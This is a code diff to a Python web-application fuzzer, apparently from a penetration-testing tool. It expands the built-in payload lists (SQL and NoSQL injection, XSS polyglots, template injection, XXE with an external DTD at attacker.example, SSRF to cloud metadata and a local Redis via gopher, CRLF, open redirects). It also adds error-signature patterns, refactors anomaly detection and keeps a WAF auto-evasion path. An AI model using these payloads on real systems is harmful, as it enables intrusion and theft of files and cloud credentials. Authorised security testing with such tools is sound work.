@@ -5,6 +5,7 @@ automated baseline differential analysis, and offensive anomaly detection.
 """
 
 import re
+import json
 import time
 import random
 import asyncio
@@ -12,6 +13,11 @@ import urllib.parse
 from typing import Dict, Any, List, Optional, Tuple
 import httpx
 from backend.user_agents import apply_rotating_user_agent
+# NOTE: mcp_core.diag is imported lazily (inside the except blocks below), not at
+# module level, because mcp_core/tools/*.py import backend.fuzzer at import time;
+# a top-level "from mcp_core import diag" here would cycle back into this
+# partially-initialized module when backend.fuzzer is imported directly/first
+# (e.g. by scripts/check_fuzzer.py) before mcp_core has finished initializing.
 
 # Predefined curated pentest payload dictionaries
 BUILTIN_PAYLOADS = {
@@ -24,7 +30,10 @@ BUILTIN_PAYLOADS = {
         "1' AND 1=2--",
         "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--",
         "1' ORDER BY 1--",
-        "1' ORDER BY 20--"
+        "1' ORDER BY 20--",
+        "1'; WAITFOR DELAY '0:0:5'--",
+        "1' AND pg_sleep(5)--",
+        "1) OR SLEEP(5)#"
     ],
     "xss": [
         "<script>alert(1)</script>",
@@ -33,7 +42,9 @@ BUILTIN_PAYLOADS = {
         "'\"><svg/onload=alert(1)>",
         "<iframe src=\"javascript:alert(1)\">",
         "<details open ontoggle=alert(1)>",
-        "{{constructor.constructor('alert(1)')()}}"
+        "{{constructor.constructor('alert(1)')()}}",
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+        "<img src=x onerror=\"alert(document.domain)\">"
     ],
     "traversal": [
         "../../../../etc/passwd",
@@ -59,7 +70,13 @@ BUILTIN_PAYLOADS = {
         "<%= 7*7 %>",
         "{{config.items()}}",
         "*{7*7}",
-        "#{7*7}"
+        "#{7*7}",
+        "${9*9}",
+        "#{6*6}",
+        "{{9*9}}",
+        "{% print(9*9) %}",
+        "[% 6*6 %]",
+        "<#assign x=6*6>${x}"
     ],
     "auth_bypass": [
         "admin",
@@ -100,6 +117,42 @@ BUILTIN_PAYLOADS = {
         '{"discount": 100}',
         '{"org_id": 1}',
         '{"plan": "unlimited"}'
+    ],
+    "nosqli": [
+        '{"$ne": null}',
+        '{"$gt": ""}',
+        "';return true;//",
+        "[$ne]=1",
+        '{"$where": "1==1"}',
+        "' || '1'=='1",
+        "admin' || 'a'=='a"
+    ],
+    "xxe": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.example/evil.dtd\"> %xxe;]><foo/>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"
+    ],
+    "ssrf": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:80",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_INFO",
+        "http://localhost:22",
+        "http://[::1]:80"
+    ],
+    "crlf": [
+        "%0d%0aSet-Cookie:x=1",
+        "%0d%0aContent-Length:0",
+        "\r\nSet-Cookie:x=1",
+        "%0d%0a%0d%0a<script>alert(1)</script>"
+    ],
+    "open_redirect": [
+        "//evil.example",
+        "https:evil.example",
+        "/\\evil.example",
+        "https://trusted.example@evil.example",
+        "/%2F/evil.example"
     ]
 }
 
@@ -114,7 +167,43 @@ SQL_ERROR_PATTERNS = [
     r"sqlite3::sqlexception",
     r"ora-01756",
     r"syntax error at or near",
-    r"microsoft ole db provider for odbc drivers"
+    r"microsoft ole db provider for odbc drivers",
+    r"unclosed quotation mark",
+    r"incorrect syntax near",
+    r"microsoft ole db provider for sql server",
+    r"ora-00933",
+    r"ora-00936",
+    r"oracle error",
+    r"sql0104n",
+    r"sql0007n",
+    r"db2 sql error"
+]
+
+NOSQL_ERROR_PATTERNS = [
+    r"mongoerror",
+    r"bsonerror",
+    r"mongodb\.driver",
+    r"unterminated string in expression",
+    r"\$where",
+    r"couchbase.*error",
+]
+
+CMDI_EVIDENCE_PATTERNS = [
+    r"uid=\d+.*gid=\d+",
+    r"root:.*:0:0:",
+]
+
+# SSTI arithmetic probes: syntax substring -> (operand expression, expected product)
+SSTI_ARITHMETIC_PROBES = [
+    ("{{7*7}}", 49),
+    ("${7*7}", 49),
+    ("<%= 7*7 %>", 49),
+    ("*{7*7}", 49),
+    ("#{7*7}", 49),
+    ("${9*9}", 81),
+    ("{{9*9}}", 81),
+    ("#{6*6}", 36),
+    ("[% 6*6 %]", 36),
 ]
 
 
@@ -189,6 +278,77 @@ def has_markers(url: str, body: str, headers: Dict[str, str]) -> bool:
     return False
 
 
+def detect_anomalies(
+    payload: str,
+    response_text: str,
+    baseline_text: str,
+    status: Optional[int],
+    baseline_status: Optional[int],
+    duration_ms: float,
+    baseline_duration_ms: float,
+) -> List[str]:
+    """
+    Pure, synchronous anomaly-detection helper shared by the fuzz worker.
+    Compares a single attack response against the recorded baseline and returns
+    the list of anomaly tags that apply. No network / IO: safe to unit test.
+    """
+    anomalies: List[str] = []
+    text = response_text or ""
+    baseline = baseline_text or ""
+    lower_text = text.lower()
+
+    # 1. Reflected payload
+    if payload and payload in text:
+        anomalies.append("REFLECTED")
+
+    # 2. Status code shift
+    if baseline_status and status is not None and status != baseline_status:
+        anomalies.append(f"STATUS_{status}")
+
+    # 3. High length delta (> 250 bytes)
+    delta = len(text) - len(baseline)
+    if abs(delta) > 250:
+        anomalies.append("DELTA_LENGTH")
+
+    # 4. Latency anomaly (e.g. sleep payload taking > 1800ms while baseline was < 600ms)
+    if duration_ms > 1800 and baseline_duration_ms < 600:
+        anomalies.append("TIME_DELAY")
+
+    # 5. SQL error leaks
+    for pattern in SQL_ERROR_PATTERNS:
+        if re.search(pattern, lower_text):
+            anomalies.append("SQL_ERROR_LEAK")
+            break
+
+    # 6. NoSQL error signatures
+    for pattern in NOSQL_ERROR_PATTERNS:
+        if re.search(pattern, lower_text):
+            anomalies.append("NOSQL_ERROR_LEAK")
+            break
+
+    # 7. Command-injection evidence (id / /etc/passwd leakage)
+    for pattern in CMDI_EVIDENCE_PATTERNS:
+        if re.search(pattern, text):
+            anomalies.append("CMDI_EVIDENCE")
+            break
+
+    # 8. SSTI arithmetic evaluation: generalized beyond the hard-coded 7*7 -> 49.
+    # Keep the backward-compatible SSTI_EVALUATED_49 tag for that specific case,
+    # and emit a general SSTI_EVALUATED tag for other arithmetic probes.
+    for probe_syntax, product in SSTI_ARITHMETIC_PROBES:
+        if probe_syntax in payload:
+            product_str = str(product)
+            if product_str in text and product_str not in baseline:
+                if product == 49:
+                    if "SSTI_EVALUATED_49" not in anomalies:
+                        anomalies.append("SSTI_EVALUATED_49")
+                else:
+                    if "SSTI_EVALUATED" not in anomalies:
+                        anomalies.append("SSTI_EVALUATED")
+
+    return anomalies
+
+
 async def run_fuzz_attack(
     base_url: str,
     method: str = "GET",
@@ -201,7 +361,8 @@ async def run_fuzz_attack(
     upstream_proxy: Optional[str] = None,
     project: str = "default",
     agent_id: str = "primary_agent",
-    auto_evade_waf: bool = True
+    auto_evade_waf: bool = True,
+    payload_type: Optional[str] = None
 ) -> Dict[str, Any]:
     """
     Executes a multi-threaded parameter fuzzing attack with automatic baseline comparison,
@@ -319,29 +480,17 @@ async def run_fuzz_attack(
                     text = resp.text or ""
                     item["preview"] = text[:600]
 
-                    # Anomaly Heuristics
-                    anomalies = []
-                    # 1. Reflected payload
-                    if payload in text:
-                        anomalies.append("REFLECTED")
-                    # 2. Status code shift
-                    if baseline_result["status_code"] and resp.status_code != baseline_result["status_code"]:
-                        anomalies.append(f"STATUS_{resp.status_code}")
-                    # 3. High length delta (> 20% or > 250 bytes)
-                    if abs(delta) > 250:
-                        anomalies.append("DELTA_LENGTH")
-                    # 4. Latency anomaly (e.g. sleep payload taking > 1800ms while baseline was < 500ms)
-                    if dur > 1800 and baseline_result["duration_ms"] < 600:
-                        anomalies.append("TIME_DELAY")
-                    # 5. SQL Error Leaks
+                    # Anomaly Heuristics (delegated to the pure, unit-testable helper)
                     lower_text = text.lower()
-                    for pattern in SQL_ERROR_PATTERNS:
-                        if re.search(pattern, lower_text):
-                            anomalies.append("SQL_ERROR_LEAK")
-                            break
-                    # 6. SSTI arithmetic evaluation (e.g. 7*7 -> 49)
-                    if ("7*7" in payload) and ("49" in text) and ("49" not in baseline_result.get("response_body_preview", "")):
-                        anomalies.append("SSTI_EVALUATED_49")
+                    anomalies = detect_anomalies(
+                        payload=payload,
+                        response_text=text,
+                        baseline_text=baseline_result.get("response_body_preview", ""),
+                        status=resp.status_code,
+                        baseline_status=baseline_result["status_code"],
+                        duration_ms=dur,
+                        baseline_duration_ms=baseline_result["duration_ms"],
+                    )
 
                     # 7. Adaptive WAF Auto-Evasion Engine
                     if auto_evade_waf and (resp.status_code == 403 or any(w in lower_text for w in ["blocked by cloudflare", "access denied", "waf", "imperva", "security violation"])):
@@ -378,7 +527,7 @@ async def run_fuzz_attack(
                             from backend.database import SessionLocal, CapturedPayload
                             import urllib.parse
                             parsed_fz = urllib.parse.urlparse(req_url)
-                            is_critical = any(a in ["SQL_ERROR_LEAK", "SSTI_EVALUATED_49"] for a in anomalies)
+                            is_critical = any(a in ["SQL_ERROR_LEAK", "SSTI_EVALUATED_49", "SSTI_EVALUATED", "NOSQL_ERROR_LEAK", "CMDI_EVIDENCE"] for a in anomalies)
                             await _dispatch_log({
                                 "project": project,
                                 "agent_id": agent_id,
@@ -424,7 +573,8 @@ async def run_fuzz_attack(
                             finally:
                                 db.close()
                         except Exception:
-                            pass
+                            from mcp_core import diag
+                            diag.exc("fuzzer: anomaly logging / Payload Vault persistence failed")
                 except Exception as e:
                     item["error"] = str(e)
                     item["anomalies"] = ["TRANSPORT_ERROR"]
@@ -466,7 +616,8 @@ async def run_fuzz_attack(
                 "finding_severity": "INFO"
             })
         except Exception:
-            pass
+            from mcp_core import diag
+            diag.exc("fuzzer: clean-session log dispatch failed")
 
     return {
         "baseline": baseline_result,
